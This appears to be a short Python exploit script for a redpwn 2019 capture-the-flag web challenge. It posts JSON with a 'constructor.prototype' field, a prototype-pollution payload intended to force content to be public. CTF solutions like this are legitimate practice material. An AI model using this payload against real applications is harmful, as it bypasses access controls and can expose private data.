import requests
 
user_id = "21baff5a5dcbcde9402b4e7ba48a168d"
url = "http://chall2.2019.redpwn.net:8002/make"
 
r = requests.post(url, cookies={"user_id": user_id}, json={"content":"yakuhito was here",
"public":True, "constructor": {"prototype": {"public": True}}})
 
print(r.text)